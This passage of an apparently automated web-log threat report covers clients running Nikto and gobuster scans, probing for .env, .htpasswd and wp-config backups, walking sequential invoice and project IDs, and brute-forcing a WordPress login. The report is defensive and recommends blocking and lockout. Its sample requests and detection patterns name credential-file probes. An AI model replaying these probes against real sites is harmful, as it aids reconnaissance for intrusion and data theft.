**SIG-UA-SCANNER**: Known scanner user agent (84 matching request\(s\); patterns: scanner-ua.)

```text
203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] "GET /config.php.old HTTP/1.1" 404 187 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] "GET /phpinfo.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] "GET /.env HTTP/1.1" 404 306 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] "GET /.htpasswd HTTP/1.1" 404 204 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
```

**SIG-SENSITIVE-PATH**: Probe for sensitive file or path (12 matching request\(s\); patterns: backup-file, phpinfo, dotenv, cloud-creds, wp-config, db-admin, git-dir, cgi-bin, server-status.)

```text
203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] "GET /config.php.old HTTP/1.1" 404 187 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] "GET /phpinfo.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] "GET /.env HTTP/1.1" 404 306 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] "GET /.htpasswd HTTP/1.1" 404 204 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
```

**BEH-LOW-AND-SLOW**: Low-and-slow path enumeration (40 miss responses \(401/403/404/410\) of 40 requests \(100%\) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules.)

```text
203.0.113.11 - - [01/Nov/2026:02:42:44 +0000] "GET /test/images2.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:42:48 +0000] "GET /backup/api-v1.php HTTP/1.1" 404 193 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:42:54 +0000] "GET /web/db.php HTTP/1.1" 404 583 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:43:04 +0000] "GET /web/cms.php HTTP/1.1" 404 479 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:43:15 +0000] "GET /data/uploads.php HTTP/1.1" 404 309 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
```

Recommended actions:

- Block or rate-limit 203.0.113.11 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 12. 203.0.113.12 (medium, score 45)

- Client: 203.0.113.12
- Score: 45/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 03:34:33 UTC to 2026-11-01 03:35:52 UTC
- Summary: 203.0.113.12 ran a gobuster scan, then enumerated paths \(80 requests answered 404/403/410\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-UA-SCANNER | medium | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | 80 | 2026-11-01 03:34:33 UTC | 2026-11-01 03:35:52 UTC |
| BEH-404-BURST | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 80 | 2026-11-01 03:34:33 UTC | 2026-11-01 03:35:52 UTC |
| BEH-LOW-AND-SLOW | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 80 | 2026-11-01 03:34:33 UTC | 2026-11-01 03:35:52 UTC |

**SIG-UA-SCANNER**: Known scanner user agent (80 matching request\(s\); patterns: scanner-ua.)

```text
203.0.113.12 - - [01/Nov/2026:03:34:33 +0000] "GET /portal HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:35 +0000] "GET /images2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:37 +0000] "GET /db HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] "GET /web HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] "GET /secret HTTP/1.1" 404 0 "-" "gobuster/3.6"
```

**BEH-404-BURST**: Burst of 404/403/410 responses \(path enumeration\) (20 miss responses \(404/403/410\) within 60s \(threshold 20\); consistent with directory guessing.)

```text
203.0.113.12 - - [01/Nov/2026:03:34:46 +0000] "GET /staging HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] "GET /uploads HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] "GET /backup HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:49 +0000] "GET /tmp HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:51 +0000] "GET /test HTTP/1.1" 404 0 "-" "gobuster/3.6"
```

**BEH-LOW-AND-SLOW**: Low-and-slow path enumeration (40 miss responses \(401/403/404/410\) of 40 requests \(100%\) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules.)

```text
203.0.113.12 - - [01/Nov/2026:03:35:08 +0000] "GET /files2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:35:09 +0000] "GET /logs2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:35:09 +0000] "GET /data2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:35:10 +0000] "GET /web2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:35:10 +0000] "GET /site2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
```

Recommended actions:

- Block or rate-limit 203.0.113.12 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 13. 2001:db8:5eed:9::/64 (medium, score 40)

- Client: 2001:db8:5eed:9::/64
- Score: 40/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 00:00:33 UTC to 2026-11-01 05:56:36 UTC
- Summary: Clients in 2001:db8:5eed:9::/64 \(30 addresses\) probed slowly over six hours \(40 misses across 40 paths\), then walked sequential IDs on /v1/projects/{id} \(25 IDs, range 1000-1048\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-LOW-AND-SLOW | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 103 | 2026-11-01 00:00:33 UTC | 2026-11-01 05:56:36 UTC |
| BEH-ID-ENUM | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 55 | 2026-11-01 00:00:33 UTC | 2026-11-01 05:53:23 UTC |

**BEH-LOW-AND-SLOW**: Low-and-slow path enumeration (distributed across 30 addresses in 2001:db8:5eed:9::/64: 40 miss responses \(401/403/404/410\) of 42 requests \(95%\) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules.)

```text
2001:db8:5eed:9:59aa:c584:7047:c0a6 - - [01/Nov/2026:01:59:03 +0000] "GET /v1/projects/1036 HTTP/1.1" 403 582 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:76bb:a2a9:5cb9:bee3 - - [01/Nov/2026:02:02:28 +0000] "GET /v1/billing-37 HTTP/1.1" 403 193 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:ba6a:d9cf:c2c7:2e3c - - [01/Nov/2026:02:05:54 +0000] "GET /v1/projects/1038 HTTP/1.1" 403 531 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:e4e8:fda6:6a0c:2c4c - - [01/Nov/2026:02:08:26 +0000] "GET /v1/backup-39 HTTP/1.1" 404 381 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:c430:c37e:80b3:af69 - - [01/Nov/2026:02:13:38 +0000] "GET /v1/internal-41 HTTP/1.1" 404 582 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
```

**BEH-ID-ENUM**: Sequential ID enumeration (distributed across 15 addresses in 2001:db8:5eed:9::/64: template /v1/projects/{id}: 25 distinct IDs \(1000..1048\) within 21600s forming a sequential walk; 23 answered non-2xx; refusal signal: 92% of IDs answered 401/403/404/410.)

```text
2001:db8:5eed:9:eaa3:9ba8:6417:dd37 - - [01/Nov/2026:02:11:07 +0000] "GET /v1/projects/1040 HTTP/1.1" 200 21602 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:2d00:bc16:5c2c:e8bd - - [01/Nov/2026:02:16:12 +0000] "GET /v1/projects/1042 HTTP/1.1" 401 442 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:1c4:a15d:23d7:1e53 - - [01/Nov/2026:02:23:08 +0000] "GET /v1/projects/1044 HTTP/1.1" 404 489 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:571a:b4ee:510c:b28a - - [01/Nov/2026:02:28:24 +0000] "GET /v1/projects/1046 HTTP/1.1" 403 247 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
2001:db8:5eed:9:79e6:9be5:aa50:962 - - [01/Nov/2026:02:36:33 +0000] "GET /v1/projects/1048 HTTP/1.1" 404 399 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
```

Recommended actions:

- Block or rate-limit 2001:db8:5eed:9::/64 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 14. 203.0.113.28 (medium, score 40)

- Client: 203.0.113.28
- Score: 40/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 00:24:23 UTC to 2026-11-01 05:05:01 UTC
- Summary: 203.0.113.28 probed slowly over five hours \(40 misses across 40 paths\), then walked sequential IDs on /v1/invoices/{id} \(25 IDs, range 5000-5024\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-LOW-AND-SLOW | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 43 | 2026-11-01 00:24:23 UTC | 2026-11-01 05:01:52 UTC |
| BEH-ID-ENUM | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 81 | 2026-11-01 00:24:23 UTC | 2026-11-01 05:05:01 UTC |

**BEH-LOW-AND-SLOW**: Low-and-slow path enumeration (40 miss responses \(401/403/404/410\) of 73 requests \(55%\) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules.)

```text
203.0.113.28 - - [01/Nov/2026:04:09:31 +0000] "GET /v1/invoices/5064 HTTP/1.1" 403 280 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:04:12:59 +0000] "GET /v1/invoices/5065 HTTP/1.1" 403 267 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:04:16:21 +0000] "GET /v1/invoices/5066 HTTP/1.1" 403 548 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:04:19:24 +0000] "GET /v1/invoices/5067 HTTP/1.1" 403 302 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:04:36:44 +0000] "GET /v1/invoices/5072 HTTP/1.1" 403 482 "-" "python-requests/2.31.0"
```

**BEH-ID-ENUM**: Sequential ID enumeration (template /v1/invoices/{id}: 25 distinct IDs \(5000..5024\) within 21600s forming a sequential walk; 15 answered non-2xx; refusal signal: 60% of IDs answered 401/403/404/410.)

```text
203.0.113.28 - - [01/Nov/2026:01:33:39 +0000] "GET /v1/invoices/5020 HTTP/1.1" 200 13915 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:01:36:53 +0000] "GET /v1/invoices/5021 HTTP/1.1" 200 22474 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:01:40:24 +0000] "GET /v1/invoices/5022 HTTP/1.1" 200 15056 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:01:44:04 +0000] "GET /v1/invoices/5023 HTTP/1.1" 403 434 "-" "python-requests/2.31.0"
203.0.113.28 - - [01/Nov/2026:01:47:35 +0000] "GET /v1/invoices/5024 HTTP/1.1" 200 3640 "-" "python-requests/2.31.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.28 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 15. 203.0.113.21 (medium, score 40)

- Client: 203.0.113.21
- Score: 40/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 00:39:19 UTC to 2026-11-01 00:51:33 UTC
- Summary: 203.0.113.21 enumerated paths \(150 requests answered 404/403/410\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-404-BURST | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 150 | 2026-11-01 00:39:19 UTC | 2026-11-01 00:51:33 UTC |
| BEH-LOW-AND-SLOW | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 150 | 2026-11-01 00:39:19 UTC | 2026-11-01 00:51:33 UTC |

**BEH-404-BURST**: Burst of 404/403/410 responses \(path enumeration\) (slow enumeration: 100 miss responses \(404/403/410\) within 900s \(threshold 100\); consistent with directory guessing.)

```text
203.0.113.21 - - [01/Nov/2026:00:46:59 +0000] "GET /files4/ HTTP/1.1" 404 198 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:05 +0000] "GET /logs4/ HTTP/1.1" 403 324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:09 +0000] "GET /data4/ HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:14 +0000] "GET /web4/ HTTP/1.1" 404 518 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:19 +0000] "GET /site4/ HTTP/1.1" 404 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

**BEH-LOW-AND-SLOW**: Low-and-slow path enumeration (40 miss responses \(401/403/404/410\) of 40 requests \(100%\) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules.)

```text
203.0.113.21 - - [01/Nov/2026:00:42:10 +0000] "GET /files1/ HTTP/1.1" 403 570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:42:15 +0000] "GET /logs1/ HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:42:19 +0000] "GET /data1/ HTTP/1.1" 404 386 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:42:25 +0000] "GET /web1/ HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:42:31 +0000] "GET /site1/ HTTP/1.1" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.21 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 16. 2001:db8:bad:1::/64 (medium, score 40)

- Client: 2001:db8:bad:1::/64
- Score: 40/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 01:23:58 UTC to 2026-11-01 01:25:37 UTC
- Summary: Clients in 2001:db8:bad:1::/64 \(200 addresses\) enumerated paths \(200 requests answered 404/403/410\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-404-BURST | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 200 | 2026-11-01 01:23:58 UTC | 2026-11-01 01:25:37 UTC |
| BEH-LOW-AND-SLOW | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 200 | 2026-11-01 01:23:58 UTC | 2026-11-01 01:25:37 UTC |

**BEH-404-BURST**: Burst of 404/403/410 responses \(path enumeration\) (distributed across 200 addresses in 2001:db8:bad:1::/64: 20 miss responses \(404/403/410\) within 60s \(threshold 20\); consistent with directory guessing.)

```text
2001:db8:bad:1:253c:5089:e2e:a1ef - - [01/Nov/2026:01:24:05 +0000] "GET /files/ HTTP/1.1" 404 533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:b174:c9f2:4600:6fdd - - [01/Nov/2026:01:24:06 +0000] "GET /logs/ HTTP/1.1" 404 213 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:57e2:ccd5:58f1:37c8 - - [01/Nov/2026:01:24:06 +0000] "GET /data/ HTTP/1.1" 404 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:d4f6:2f4e:ec88:eca5 - - [01/Nov/2026:01:24:06 +0000] "GET /web/ HTTP/1.1" 404 383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:cfe4:1c99:a70f:1071 - - [01/Nov/2026:01:24:06 +0000] "GET /site/ HTTP/1.1" 404 172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

**BEH-LOW-AND-SLOW**: Low-and-slow path enumeration (distributed across 40 addresses in 2001:db8:bad:1::/64: 40 miss responses \(401/403/404/410\) of 40 requests \(100%\) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules.)

```text
2001:db8:bad:1:9f88:9352:a40c:46da - - [01/Nov/2026:01:24:15 +0000] "GET /files1/ HTTP/1.1" 404 563 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:4d:e96e:b14e:adc7 - - [01/Nov/2026:01:24:16 +0000] "GET /logs1/ HTTP/1.1" 404 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:2b9:d27d:39b2:9c58 - - [01/Nov/2026:01:24:16 +0000] "GET /data1/ HTTP/1.1" 404 520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:c766:270f:c10b:7384 - - [01/Nov/2026:01:24:16 +0000] "GET /web1/ HTTP/1.1" 404 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
2001:db8:bad:1:e14f:64ef:8800:76b4 - - [01/Nov/2026:01:24:16 +0000] "GET /site1/ HTTP/1.1" 404 544 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 2001:db8:bad:1::/64 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 17. 203.0.113.22 (medium, score 35)

- Client: 203.0.113.22
- Score: 35/100
- Severity: medium
- Stages: credential-access
- Window: 2026-11-01 01:00:34 UTC to 2026-11-01 01:04:28 UTC
- Summary: 203.0.113.22 brute-forced a login \(60 login attempts\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | medium | [T1110](https://attack.mitre.org/techniques/T1110/) | 60 | 2026-11-01 01:00:34 UTC | 2026-11-01 01:04:28 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s \(threshold 10\); 0 explicit 401/403 failures; status-agnostic; lower confidence.)

```text
203.0.113.22 - - [01/Nov/2026:01:00:56 +0000] "POST /wp-login.php HTTP/1.1" 200 2645 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:01 +0000] "POST /wp-login.php HTTP/1.1" 200 2583 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:04 +0000] "POST /wp-login.php HTTP/1.1" 200 2628 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:08 +0000] "POST /wp-login.php HTTP/1.1" 200 2629 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:11 +0000] "POST /wp-login.php HTTP/1.1" 200 2509 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.22 at the WAF or firewall.
- Enforce account lockout or MFA on the targeted login endpoint and check for any successful logins from this client.
